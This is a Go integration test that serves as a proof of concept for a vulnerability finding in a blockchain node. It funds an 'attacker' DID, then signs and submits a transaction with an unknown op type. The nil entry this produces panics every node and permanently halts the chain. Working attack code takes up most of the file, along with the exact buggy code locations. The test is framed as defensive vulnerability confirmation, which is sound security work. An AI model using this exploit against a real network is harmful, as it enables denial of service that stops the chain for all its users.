package devnet

// F4 devnet proof-of-concept — unprivileged nil-op permanent chain-halt
//
// The bug chain (all at commit bf473b1f):
//   transactions.go:1261  OffchainTransaction.ToTransaction() switch has no
//                          default → unknown op.Type leaves vtx as nil interface
//   system_txs.go:1129-33 nil appended unfiltered to TxPacket.Ops
//   state_engine.go:1931  ExecuteBatch loop calls vscTx.Type() on the nil BEFORE
//                          any recover() → ProcessBlock panics on every ingesting node
//
// This test boots a 4-node devnet, funds an attacker Ethereum DID with enough
// HBD for resource credits, crafts a validly-signed off-chain VSC transaction
// with op.Type="consensus_stake" (an unknown off-chain type), submits it via the
// submitTransactionV1 GQL mempool mutation, waits for the block producer to
// include it in a VSC block, and asserts the halt.
//
// VERDICT signals:
//   DEVNET-CONFIRMED  — heights freeze + nil-pointer panic in docker logs
//   KILLED            — network keeps advancing (pool has op-type allowlist,
//                       or nil-filter guards ExecuteBatch, or nil.Type() is recovered)
//   BLOCKED-why       — devnet failed to start or fund path errored; see log
//
// Run:
//   go test -v -run TestF4DevnetNilOpHalt -timeout 20m ./tests/devnet/

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
	"time"

	"vsc-node/lib/dids"
	"vsc-node/modules/common"
	"vsc-node/modules/common/params"
	systemconfig "vsc-node/modules/common/system-config"
	transactionpool "vsc-node/modules/transaction-pool"

	ethCrypto "github.com/ethereum/go-ethereum/crypto"
)

// TestF4DevnetNilOpHalt is the DEVNET-level proof-of-concept for finding F4.
func TestF4DevnetNilOpHalt(t *testing.T) {
	requireDocker(t)

	// ── Phase 0: bring up a fast 4-node devnet ─────────────────────────────
	cfg := DefaultConfig()
	cfg.Nodes = 4       // minimum valid devnet
	cfg.GenesisNode = 4 // mirror DefaultConfig invariant (genesis = last node); must be 1..Nodes
	cfg.LogLevel = "info"
	cfg.SysConfigOverrides = &systemconfig.SysConfigOverrides{
		ConsensusParams: &params.ConsensusParams{
			ElectionInterval: 20, // ~60s epochs; fast enough for block inclusion
		},
	}

	// startDevnetNoKey handles New+Start+t.Cleanup for us.
	d, ctx := startDevnetNoKey(t, cfg, 20*time.Minute)

	t.Logf("F4: devnet running: GQL=%s Hive=%s", d.GQLEndpoint(1), d.HiveRPCEndpoint())

	// ── Phase 1: confirm blocks are advancing ──────────────────────────────
	t.Log("F4: waiting for all nodes to advance (baseline)...")
	{
		poll, cancel := context.WithTimeout(ctx, 4*time.Minute)
		defer cancel()

		// Poll until we see every node produce a new block three consecutive times.
		var last [4]uint64
		for attempt := 0; attempt < 3; attempt++ {
			time.Sleep(15 * time.Second)
			all := true
			for n := 1; n <= cfg.Nodes; n++ {
				h, _, err := d.LocalNodeInfo(poll, n)
				if err != nil {
					t.Logf("F4: magi-%d not yet responding (%v)", n, err)
					all = false
					break
				}
				if h == last[n-1] && attempt > 0 {
					t.Logf("F4: magi-%d height stuck at %d", n, h)
					all = false
					break
				}
				last[n-1] = h
			}
			if all && attempt > 0 {
				break
			}
		}
		t.Logf("F4: baseline heights %v — blocks confirmed advancing", last)
	}

	// ── Phase 2: fund attacker ETH DID with HBD for resource credits ───────
	//
	// Off-chain txs need: valid DID signature + hive:account-or-DID that has
	// enough HBD for rc_limit.  We generate a fresh Ethereum private key,
	// deposit HBD to magi.test1's VSC account via the gateway, then transfer
	// some HBD on to the attacker DID so the rc-system check passes.

	privKey, err := ethCrypto.GenerateKey()
	if err != nil {
		t.Fatalf("F4 BLOCKED: generating ETH key: %v", err)
	}
	ethAddr := ethCrypto.PubkeyToAddress(privKey.PublicKey).Hex()
	attackerDIDStr := dids.EthDIDPrefix + ethAddr // "did:pkh:eip155:1:0x..."
	t.Logf("F4: attacker DID = %s", attackerDIDStr)

	witnessAcct := "hive:" + d.witnessAccount(1)

	// waitForHbd polls node-1's getAccountBalance until the account's VSC HBD
	// reaches min base-units (3 decimals: 2.000 HBD == 2000), or timeout. Returns
	// the last balance seen. Fixed sleeps are unreliable: this devnet's HAF
	// testnet L1 can produce blocks far slower than 3s (genesis observed ~16s/
	// block), so deposits and transfers take a variable, minutes-long time to be
	// streamed and credited. The earlier 12s sleep raced the credit → the poison
	// submit hit "not enough RCS" before the DID was funded (false KILL).
	waitForHbd := func(account string, min int64, timeout time.Duration) int64 {
		poll, cancel := context.WithTimeout(ctx, timeout)
		defer cancel()
		var last int64 = -1
		for {
			if bal, berr := d.GetAccountBalance(poll, 1, account); berr == nil && bal != nil {
				last = bal.Hbd
				if bal.Hbd >= min {
					return bal.Hbd
				}
			}
			select {
			case <-poll.Done():
				return last
			case <-time.After(5 * time.Second):
			}
		}
	}

	// Deposit 5 HBD from magi.test1's Hive L1 balance into the VSC ledger.
	// (witnesses were funded with 100 TBD by fundAccounts during devnet startup)
	if _, err := d.Deposit(ctx, 1, "5.000", "hbd"); err != nil {
		t.Fatalf("F4 BLOCKED: deposit HBD for witness-1: %v", err)
	}
	t.Log("F4: deposited 5.000 HBD into magi.test1 VSC ledger; waiting for credit...")
	if got := waitForHbd(witnessAcct, 5000, 5*time.Minute); got < 5000 {
		t.Fatalf("F4 BLOCKED: deposit never credited to %s (last hbd=%d) — devnet L1 too slow", witnessAcct, got)
	}
	t.Logf("F4: %s credited (hbd>=5000)", witnessAcct)

	// Transfer 2 HBD from hive:magi.test1 → attacker ETH DID.
	// TxVSCTransfer.ExecuteTx accepts any "did:*" or "hive:*" recipient and keys
	// the balance verbatim (ledger_session.ExecuteTransfer), and the rc payer is
	// RequiredAuths[0] (state_engine.go:1978) — the same DID string — so the
	// attacker DID's RC budget is exactly its credited HBD.
	transferPayload := map[string]interface{}{
		"from":   witnessAcct,
		"to":     attackerDIDStr,
		"amount": "2.000",
		"asset":  "hbd",
		"net_id": d.netId(),
	}
	txId, err := d.BroadcastCustomJSON("vsc.transfer", []string{d.witnessAccount(1)}, transferPayload, d.cfg.InitminerWIF)
	if err != nil {
		t.Fatalf("F4 BLOCKED: transfer HBD to attacker DID: %v", err)
	}
	t.Logf("F4: transferred 2.000 HBD to attacker DID (L1 tx=%s); waiting for credit...", txId)
	if got := waitForHbd(attackerDIDStr, 2000, 5*time.Minute); got < 2000 {
		t.Fatalf("F4 BLOCKED: attacker DID never credited (last hbd=%d) — funding too slow or wrong ledger key", got)
	}
	t.Log("F4: attacker DID credited with >=2.000 HBD — RC budget ready")

	// ── Phase 3: craft, sign, and submit the poison off-chain tx ───────────
	//
	// op.Type = "consensus_stake" is NOT in OffchainTransaction.ToTransaction()'s
	// switch (only call/transfer/withdraw/stake_hbd/unstake_hbd are handled).
	// No default case → vtx stays nil → appended to slice → ExecuteBatch panics.
	//
	// rc_limit: RcCostUnknown=50 covers the cost; 2 HBD (≥2000 base units) is
	// more than enough for the rc-system check.

	emptyPayload, err := common.EncodeDagCbor(map[string]interface{}{})
	if err != nil {
		t.Fatalf("F4 BLOCKED: encoding empty CBOR payload: %v", err)
	}

	poisonTx := &transactionpool.VSCTransaction{
		Ops: []transactionpool.VSCTransactionOp{
			{
				Type:    "consensus_stake", // unknown off-chain op → nil VSCTransaction
				Payload: emptyPayload,
				RequiredAuths: struct {
					Active  []string
					Posting []string
				}{
					Active: []string{attackerDIDStr},
				},
			},
		},
		Nonce:   0,    // first tx from a fresh DID; nonce 0 is always valid
		NetId:   d.netId(),
		RcLimit: 50,   // RcCostUnknown = 50; within the attacker's 2 HBD budget
	}

	serialized, err := poisonTx.Serialize()
	if err != nil {
		t.Fatalf("F4 BLOCKED: serializing poison tx: %v", err)
	}

	signableBlk, err := poisonTx.ToSignableBlock()
	if err != nil {
		t.Fatalf("F4 BLOCKED: building signable block: %v", err)
	}

	ethProvider := dids.NewEthProvider(privKey)
	sigStr, err := ethProvider.Sign(signableBlk)
	if err != nil {
		t.Fatalf("F4 BLOCKED: signing poison tx: %v", err)
	}

	sigPackage := transactionpool.SignaturePackage{
		Type: "vsc-sig",
		Sigs: []common.Sig{
			{Algo: "eth", Kid: attackerDIDStr, Sig: sigStr},
		},
	}
	sigBytes, err := common.EncodeDagCbor(sigPackage)
	if err != nil {
		t.Fatalf("F4 BLOCKED: encoding signature package: %v", err)
	}

	b64Tx := base64.StdEncoding.EncodeToString(serialized.Tx)
	b64Sig := base64.StdEncoding.EncodeToString(sigBytes)

	// submitTransactionV1 is declared in `type Query` in the schema, so we use "query" syntax.
	const gqlSubmit = `query($tx:String!,$sig:String!){submitTransactionV1(tx:$tx,sig:$sig){id}}`
	var submitOut struct {
		SubmitTransactionV1 *struct {
			Id *string `json:"id"`
		} `json:"submitTransactionV1"`
	}
	err = d.gqlQuery(ctx, 1, gqlSubmit, map[string]any{"tx": b64Tx, "sig": b64Sig}, &submitOut)
	if err != nil {
		// classify the error
		errMsg := err.Error()
		switch {
		case strings.Contains(errMsg, "rc_limit insufficient"):
			t.Logf("F4: KILL-CONDITION — tx pool rejected: op-type allowlist or RC bounds block unknown ops")
		case strings.Contains(errMsg, "not enough RCS"):
			t.Logf("F4: KILL-CONDITION — attacker DID has insufficient RCs (transfer didn't land in time)")
		case strings.Contains(errMsg, "missing required auth") || strings.Contains(errMsg, "failed to parse DID"):
			t.Logf("F4: KILL-CONDITION — signature/DID validation blocked unknown op type")
		case strings.Contains(errMsg, "nonce"):
			t.Logf("F4: KILL-CONDITION — nonce check blocked submission: %v", err)
		default:
			t.Logf("F4: submit error (may be transient or kill condition): %v", errMsg)
		}
		t.Logf("F4: VERDICT=KILLED — pool rejected poison tx; chain halt not triggered via this path")
		return
	}

	txCID := "<unknown>"
	if submitOut.SubmitTransactionV1 != nil && submitOut.SubmitTransactionV1.Id != nil {
		txCID = *submitOut.SubmitTransactionV1.Id
	}
	t.Logf("F4: poison tx ACCEPTED by node-1 mempool — CID=%s", txCID)
	t.Logf("F4: now waiting for block producer to include tx and all nodes to panic...")

	// ── Phase 4: poll head heights for up to 3 minutes ─────────────────────
	//
	// Normal block cadence: ~3s Hive blocks; a VSC block may span several Hive
	// blocks.  After the poison tx is included and the VSC block lands, ALL nodes
	// processing that Hive block will panic in ExecuteBatch.  They may:
	//   (a) crash the node process entirely → container exits, GQL unreachable
	//   (b) just freeze ProcessBlock loop
	// Either way, head heights stop advancing.

	var preHeights [4]uint64
	for n := 1; n <= cfg.Nodes; n++ {
		h, _, _ := d.LocalNodeInfo(ctx, n)
		preHeights[n-1] = h
	}
	t.Logf("F4: heights at poison-tx submit time: %v", preHeights)

	frozenSec := 0
	const pollSec = 5
	const haltThreshSec = 30 // 30s with zero progress → halt

	deadline := time.Now().Add(3 * time.Minute)
	halted := false
	var haltHeights [4]uint64
	copy(haltHeights[:], preHeights[:])

	for time.Now().Before(deadline) {
		time.Sleep(pollSec * time.Second)
		var cur [4]uint64
		anyAdvanced := false
		for n := 1; n <= cfg.Nodes; n++ {
			h, _, err := d.LocalNodeInfo(ctx, n)
			if err != nil {
				// node unreachable → either GQL is down (crash) or just slow;
				// treat as no advancement for halt detection
				cur[n-1] = haltHeights[n-1]
				continue
			}
			cur[n-1] = h
			if h > haltHeights[n-1] {
				anyAdvanced = true
				frozenSec = 0
			}
		}
		haltHeights = cur
		t.Logf("F4 heights: %v (frozenSec=%d)", haltHeights, frozenSec)

		if !anyAdvanced {
			frozenSec += pollSec
		}
		if frozenSec >= haltThreshSec {
			halted = true
			break
		}
	}

	// ── Phase 5: capture docker logs for panic evidence ─────────────────────
	nilPtrSeen := false
	panicSeen := false
	var panicNode int
	var panicLines []string

	for n := 1; n <= cfg.Nodes; n++ {
		logs, err := d.Logs(ctx, fmt.Sprintf("magi-%d", n))
		if err != nil {
			t.Logf("F4: logs unavailable for magi-%d: %v", n, err)
			continue
		}
		for _, line := range strings.Split(logs, "\n") {
			if strings.Contains(line, "panic") {
				panicSeen = true
				if panicNode == 0 {
					panicNode = n
				}
				panicLines = append(panicLines, fmt.Sprintf("magi-%d: %s", n, line))
			}
			if strings.Contains(line, "nil pointer dereference") ||
				strings.Contains(line, "invalid memory address") {
				nilPtrSeen = true
				panicLines = append(panicLines, fmt.Sprintf("magi-%d: %s", n, line))
			}
			if strings.Contains(line, "ExecuteBatch") ||
				strings.Contains(line, "ProcessBlock") ||
				strings.Contains(line, "ToTransaction") {
				panicLines = append(panicLines, fmt.Sprintf("magi-%d: %s", n, line))
			}
		}
	}

	for _, pl := range panicLines {
		t.Logf("F4 PANIC LOG: %s", pl)
	}

	// Container liveness check
	runningOut, _ := d.composeOutput(ctx, "ps", "--services", "--filter", "status=running")
	t.Logf("F4: running services after poison: [%s]", strings.TrimSpace(runningOut))

	deadNodes := 0
	for n := 1; n <= cfg.Nodes; n++ {
		svc := fmt.Sprintf("magi-%d", n)
		if !strings.Contains(runningOut, svc) {
			deadNodes++
			t.Logf("F4: magi-%d NOT in running list (crashed / exited)", n)
		}
	}

	// ── Phase 6: VERDICT ────────────────────────────────────────────────────
	switch {
	case halted && nilPtrSeen:
		t.Logf("F4: VERDICT=DEVNET-CONFIRMED — chain halted (%ds frozen) + nil-pointer panic in node logs", frozenSec)
		if deadNodes > 0 {
			t.Logf("F4: producer-emits-vs-crashes: %d container(s) exited → ALL-NODES-HALT (block was emitted, every ingesting node panicked)", deadNodes)
		}
		// t.Errorf marks the test as failed so CI treats this as an open exploit.
		t.Errorf("F4: CRITICAL — chain halt confirmed on devnet; fix required before mainnet")

	case halted && panicSeen && !nilPtrSeen:
		t.Logf("F4: VERDICT=DEVNET-CONFIRMED-HALT — halted (%ds) + panic in logs (nil pointer may be in stderr only)", frozenSec)
		t.Errorf("F4: CRITICAL — chain halt confirmed on devnet")

	case halted && !panicSeen:
		t.Logf("F4: VERDICT=DEVNET-CONFIRMED-HALT-NO-PANIC — heights frozen but no panic logged (container may have exited silently)")
		if deadNodes > 0 {
			t.Errorf("F4: CRITICAL — %d container(s) died + heights frozen", deadNodes)
		} else {
			t.Errorf("F4: CRITICAL — heights frozen for %ds after poison tx; cause unclear from logs", frozenSec)
		}

	case !halted && !panicSeen:
		// Network kept going → kill condition met
		t.Logf("F4: VERDICT=KILLED — chain kept advancing after poison tx inclusion")
		t.Logf("F4: Kill-condition evidence: heights at end %v (pre-submit: %v)", haltHeights, preHeights)
		// Test PASSES — the bug was not exploitable via this path (fix in place or guard exists)

	default:
		t.Logf("F4: VERDICT=INCONCLUSIVE — halted=%v panic=%v nilPtr=%v deadNodes=%d", halted, panicSeen, nilPtrSeen, deadNodes)
	}
}
